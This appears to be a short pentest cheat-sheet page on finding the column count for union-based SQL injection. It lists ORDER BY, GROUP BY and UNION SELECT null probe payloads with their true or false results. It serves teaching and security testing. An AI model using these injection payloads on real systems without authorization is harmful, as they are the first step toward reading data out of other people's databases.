# Detect number of columns

To exploit Union Based vulnerabilities for SQLi, both queries must return the same number of columns.
There are two ways to find out the number of columns the initial request is returning.

## ORDER BY/GROUP BY

GROUP BY and ORDER BY have different functionality in SQL, but for this purpose both can be used: 
Keep incrementing the number until `False`.

```text
1' ORDER BY 1--+    # True
1' ORDER BY 2--+    # True
1' ORDER BY 3--+    # True
1' ORDER BY 4--+    # False - Query is only using 3 columns
```
```text
1' GROUP BY 1--+    # True
1' GROUP BY 2--+    # True
1' GROUP BY 3--+    # True
1' GROUP BY 4--+    # False - Query is only using 3 columns
```

    #-1' UNION SELECT 1,2,3--+    True

## UNION SELECT

Select more and more `null` values (`null` is valid in every case) until the query is correct:

```text
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```

    #-1' UNION SELECT 1,2,3--+    True

## Resources

* [SQL ORDER BY clause](https://www.sqltutorial.org/sql-order-by/)
* [SQL GROUP BY clause](https://www.sqltutorial.org/sql-group-by/)